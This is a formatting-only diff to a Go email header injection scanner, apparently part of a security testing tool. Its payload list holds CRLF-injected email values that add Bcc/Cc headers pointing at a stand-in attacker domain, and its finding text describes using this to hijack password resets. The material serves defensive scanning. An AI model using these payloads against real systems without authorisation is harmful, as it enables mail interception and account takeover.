@@ -26,7 +26,7 @@ func (s *EmailHeaderInjectionScanner) Scan(ctx context.Context, target string, c
 	payloads := []map[string]string{
 		{"email": "victim@example.com\r\nBcc: temren@evil.example"},
 		{"email": "victim@example.com%0d%0aBcc:temren@evil.example"},
-		{"to":    "victim@example.com\nCc:temren@evil.example"},
+		{"to": "victim@example.com\nCc:temren@evil.example"},
 	}
 	var findings []Finding
 	for _, p := range payloads {
@@ -45,7 +45,7 @@ func (s *EmailHeaderInjectionScanner) Scan(ctx context.Context, target string, c
 			findings = append(findings, Finding{
 				URL: target, Title: "Email Field Accepts CRLF — Possible SMTP Header Injection",
 				Description: "Server returned success when the email field contained CR/LF. If a mailer uses the value verbatim, attackers can inject Bcc/Cc to ex-filtrate signup messages or hijack password resets.",
-				Severity: SeverityHigh, Confidence: ConfidenceLow, Scanner: s.Name(),
+				Severity:    SeverityHigh, Confidence: ConfidenceLow, Scanner: s.Name(),
 				Payload: string(buf), Timestamp: time.Now(),
 				OWASPCategory: "A03:2021-Injection", CVSSScore: 7.5,
 			})
